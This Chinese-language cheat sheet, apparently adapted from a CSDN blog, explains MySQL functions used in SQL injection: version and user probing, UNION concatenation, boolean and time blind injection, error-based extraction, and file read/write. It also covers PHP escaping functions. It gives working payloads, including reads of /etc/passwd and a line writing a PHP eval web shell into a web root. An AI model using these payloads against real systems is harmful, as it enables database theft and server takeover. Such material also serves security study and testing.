MySQL注入常用函数整理（基于目标网页内容）

本文围绕目标网页中提及的MySQL数据库注入相关函数，按功能场景分类整理，涵盖基本信息探测、联合注入、盲注、报错注入、文件读写及PHP辅助函数，包含函数语法、作用及实操示例，助力理解MySQL注入中的函数应用逻辑。

来源：sql注入常见函数（附图详解）_sql注入常用函数分类-CSDN博客

一、MySQL基础信息探测函数

此类函数用于获取数据库核心基础信息（版本、用户名、路径等），是注入攻击的初始探测工具，为后续攻击方向提供依据。

函数/语句 语法示例 功能说明
数据库版本 version() 返回当前MySQL数据库的版本号，例如执行select version()可能返回“8.0.32”。
当前用户名 user() 返回当前数据库连接的用户名，例如select user()可能返回“root@localhost”。
当前数据库名 database() 返回当前连接的数据库名称，例如select database()可能返回“security”。
数据库安装路径 @@basedir 返回MySQL数据库的安装目录路径，如“C:\Program Files\MySQL\MySQL Server 8.0\”。
数据库文件存储路径 @@datadir 返回数据库数据文件（如表结构、数据文件）的存放路径，如“C:\ProgramData\MySQL\MySQL Server 8.0\Data\”。
操作系统版本 @@version_compile_os 返回数据库所在服务器的操作系统版本，如“Win64”“Linux x86_64”。

二、UNION联合注入专用函数

UNION联合注入需将多表查询结果拼接展示，此类函数用于处理查询结果的字符串格式，实现多列/多表数据的整合输出，方便攻击者一次性读取关键信息。

函数名称 语法格式 功能说明 实操示例及结果
concat() concat(str1, str2, ...) 无分隔符拼接多个字符串，直接将参数中的字符串首尾连接。 执行select concat('abc','def','ghi')，返回结果为“abcdefghi”。
concat_ws() concat_ws('separator', str1, str2, ...) 按指定分隔符（separator）拼接多个字符串，分隔符仅在字符串之间插入。 1. 执行select concat_ws('?',1,2,3,4,5)，返回“1?2?3?4?5”；
2. 执行select concat_ws('/', 'abc','def','ghi')，返回“abc/def/ghi”。
group_concat() group_concat(column_name) 将指定列（column_name）的所有数据以逗号为默认分隔符拼接成一个字符串，常用于读取表中所有目标数据。 执行select group_concat(username) from users，返回“Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,…”（users表中所有username值）。

三、SQL盲注函数

当注入无直接结果回显（页面仅显示“成功/失败”或无变化）时，需通过盲注函数间接推断数据。盲注分为布尔盲注（基于真/假判断）和时间盲注（基于延迟判断），两类函数分别对应不同盲注场景。

1. 布尔盲注函数（真/假推断数据）

通过函数返回的“真（1）/假（0）”触发页面差异，逐字符/逐长度猜解数据库名、表名、字段值等信息。

函数名称 语法格式 功能说明 实操示例及结果
length() length(object) 返回指定对象（如数据库名、字段值）的字符长度，用于先确定目标数据的长度范围。 执行select length(database())，若当前数据库为“security”（8个字符），返回结果为“8”。
left() left(str, num) 从字符串str的左侧开始，截取前num个字符，与right()函数功能相反。 1. 执行select left(database(),2)='se'，若数据库为“security”，返回“1”（真）；
2. 执行select left(database(),3)，返回“sec”。
right() right(str, num) 从字符串str的右侧开始，截取后num个字符，用法与left()对称。 若数据库为“security”，执行select right(database(),3)，返回“ity”。
substr() substr(str, pos, len) 从字符串str的第pos位开始，截取长度为len的字符（与substring()功能完全一致）。 1. 执行substr(database(),1,3)（数据库为“security”），返回“sec”；
2. 执行substr(database(),4,1)，返回“u”。
mid() mid(str, pos, len) 与substr()用法、功能完全一致，可互换使用，用于截取字符串指定片段。 1. 执行mid(database(),4,1)（数据库为“security”），返回“u”；
2. 执行mid(database(),4)（省略len则截取到字符串末尾），返回“urity”。
ascii() ascii(str) 返回字符串str最左侧第一个字符的ASCII码值（范围0-255），用于逐字符猜解数据（将字符转为ASCII码判断）。 1. 执行select ascii('s')，返回“115”；
2. 执行select ascii('sa')>100，返回“1”（真，因’s’的ASCII码115>100）。
ord() ord(str) 与ascii()功能完全一致，返回字符串str第一个字符的ASCII码值，可互换使用。 1. 执行select ord('a')，返回“97”；
2. 执行select ord('b')>97，返回“1”（真）。

2. 时间盲注函数（延迟推断数据）

当布尔盲注无页面差异时，通过函数触发“固定时间延迟”，以“页面是否延迟响应”判断条件真假，间接推断数据。

函数名称 语法格式 功能说明 实操示例及逻辑
sleep() sleep(seconds) 使当前SQL执行线程暂停指定秒数（seconds），触发页面延迟响应。 执行select sleep(5)，页面会延迟5秒后返回结果。
if() if(condition, true_result, false_result) 条件判断函数：若condition为真，返回true_result；若为假，返回false_result。常与sleep()结合实现时间盲注。 构造注入语句?id=1" and if(length(database())=8, sleep(5), 1)--+：
- 若当前数据库名长度为8，页面延迟5秒；
- 若长度不为8，无延迟。

四、报错注入函数

当页面会显示数据库错误信息时，利用此类函数构造“合法语法但逻辑错误”的SQL语句，使数据库报错并带出目标数据（如数据库名、表名、字段值），是高效获取数据的注入方式。

函数名称 语法格式 功能原理与说明 实操示例及报错结果
floor() floor(number) 对数值number向下取整（如floor(3.8)=3），常与rand()（生成0-1随机数）、group by结合，因“随机数重复导致分组冲突”报错，带出数据。 构造语句select concat(database(), floor(rand(0)*2)) from users group by concat(database(), floor(rand(0)*2))，报错信息含“Duplicate entry ‘security1’ for key ‘group_key’”，其中“security”为当前数据库名。
exp() exp(number) 计算以自然常数e为底的指数函数（如exp(1)=2.718...），当number超过709时，会触发“DOUBLE值溢出”错误；结合~（按位取反）可将子查询结果带入报错。 1. 执行select exp(710)，直接报错“ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(710)’”；
2. 构造注入语句1" union select 1,2,exp(~(select * from (select database())a))--+，报错信息含“DOUBLE value is out of range in ‘exp(~((select ‘security’ from dual)))’”，其中“security”为当前数据库名。
updatexml() updatexml(XML_doc, XPath_str, new_val) 原本用于修改XML文档中指定XPath路径的节点值；若XPath_str不符合XPath语法（如含特殊字符~），会触发语法错误，同时带出concat()拼接的目标数据。 执行select updatexml(1,concat(0x7E,(select database()),0x7E),1)，报错信息含“ERROR 1105 (HY000): XPATH syntax error: ‘security‘”，其中“security”为当前数据库名（0x7E是``的十六进制编码，用于避免字符被转义）。
extractvalue() extractvalue(XML_doc, XPath_str) 原本用于提取XML文档中指定XPath路径的节点值；若XPath_str不符合语法，会触发报错并带出目标数据，用法与updatexml()类似（少一个“替换值”参数）。 1. 执行select extractvalue(1,concat(0x7E,(select database()),0x7E))，报错含“XPATH syntax error: ‘security~’”；
2. 执行select extractvalue(1,concat(0x7E,(select group_concat(username) from users),0x7E))，报错含“XPATH syntax error: ‘Dumb,Angelina,Dummy,…’”（users表中所有username）。

五、文件读写函数

此类函数用于读取数据库所在服务器的本地文件，或向服务器写入恶意文件（如木马），需满足“MySQL权限允许（如secure_file_priv配置）”和“文件路径可访问”条件，是注入攻击中“脱库”或“控制服务器”的关键工具。

函数名称 语法格式 功能说明 实操示例
load_file() load_file(file_path) 读取服务器上指定路径（file_path）的文件内容，支持/或\\作为路径分隔符。 执行union select 1,2,load_file('/etc/passwd')（Linux系统），可读取系统用户配置文件/etc/passwd的内容；Windows系统可执行load_file('C:\\Windows\\system32\\drivers\\etc\\hosts')读取hosts文件。
into outfile select ... into outfile file_path 将SQL查询结果写入服务器指定路径（file_path）的文件中，与into dumpfile功能类似（dumpfile更适合写入二进制文件）。 构造语句union select 1,2,"<?php @eval($_POST[cmd]);?>" into dumpfile '/var/www/html/a.php'（假设服务器存在Web目录/var/www/html），向该目录写入PHP一句话木马文件a.php，后续可通过木马控制服务器。

六、PHP辅助函数（与SQL注入防御相关）

此类函数是PHP开发中用于处理用户输入、防御SQL注入的工具，攻击者需了解其作用机制，以绕过防御（如判断是否开启转义、是否可取消转义）。

函数名称 语法格式 功能说明 实操示例及效果
addslashes() addslashes(str) 对字符串str中的预定义特殊字符（单引号'、双引号"、反斜杠\、NULL）前添加反斜杠，避免SQL注入中的字符截断或语法错误。 对字符串"Who's Bill Gates?"执行addslashes()，返回"Who\'s Bill Gates?"，使该字符串在SQL查询中不会破坏语句结构。
stripslashes() stripslashes(str) 删除由addslashes()添加的反斜杠，恢复字符串原始格式，常用于“输入时转义、输出时恢复”的场景。 对"Who\'s Bill Gates?"执行stripslashes()，返回"Who's Bill Gates?"。
get_magic_quotes_gpc() get_magic_quotes_gpc() 获取PHP配置中magic_quotes_gpc的状态（已废弃，但旧版本仍可能存在）：
- 返回1：开启，自动对GET/POST/COOKIE输入的特殊字符转义；
- 返回0：关闭，需手动用addslashes()转义。		 若执行echo get_magic_quotes_gpc()返回1，说明用户输入已被自动转义，攻击者需先处理转义字符才能注入；返回0则需关注是否有手动转义逻辑。
mysql_real_escape_string() mysql_real_escape_string(str) 转义SQL语句中字符串的特殊字符（包括\x00、\n、\r、'、"、\x1a），比addslashes()更适配MySQL的字符集，防御效果更优（注：该函数属于旧MySQL扩展，已被mysqli_real_escape_string()替代）。 对字符串"test' or 1=1#"执行mysql_real_escape_string()，返回"test\' or 1=1#"，避免该字符串构造出"select * from user where name='test' or 1=1#'"这类注入语句。
